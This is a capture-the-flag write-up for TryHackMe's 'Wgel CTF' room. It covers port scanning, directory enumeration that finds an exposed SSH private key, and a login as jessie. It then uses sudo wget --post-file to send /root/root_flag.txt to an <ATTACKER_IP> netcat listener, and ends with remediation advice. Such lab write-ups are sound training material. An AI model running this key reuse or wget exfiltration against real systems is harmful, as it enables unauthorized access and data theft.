# Wgel CTF
---
[TryHackMe](https://tryhackme.com/room/wgelctf)
>|easy|linux|web|
---
Firstly, we scan the target:
`nmap -sV -sC -T4 $IP -oN wgel.nmap`
This reveals 2 open ports - 22 and 80.

Upon inspecting the web, which shows Apache default page, we notice there is a comment meant as a message for *Jessie*, which will be important later.
![default page](./img/default_page.png)
Enumerating with gobuster
`gobuster dir -u $IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
reveals sitemap.
We enumerate again as everything seems accessible through the sitemap endpoint:
`gobuster dir -u $IP/sitemap -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
This time, gobuster found *.ssh*, where is a *id_rsa* private key a public disclosure of private key caused by puttin it under the web root.

We try to connect to ssh as Jessie `chmod 600 id_rsa; ssh -i id_rsa jessie@$IP`, which succeeds.
Now, we obtain the user flag from `$HOME/Documents/user_flag.txt`.
![user flag](./img/user_flag_redacted.png)
Checking for privileged access
`sudo -l` reveals that Jessie can use `wget` as root which lets us exfiltrate sensitive information.
![priv esc](./img/sudo_L.png)
using this we recover the root flag:
`sudo /usr/bin/wget --post-file=/root/root_flag.txt <ATTACKER_IP>:1234`
and on the local machine `nc -nvlp 1234`.
![root flag](./img/root_flag_redacted.png)

## Remediation 
Avoid placing sensitive files, credentials backups and similar files to the server document root.
Avoid disclosing unnecessary information like usernames etc.
Restrict sudo privileges to necessary commands only, `wget` should typically not be executable as root.
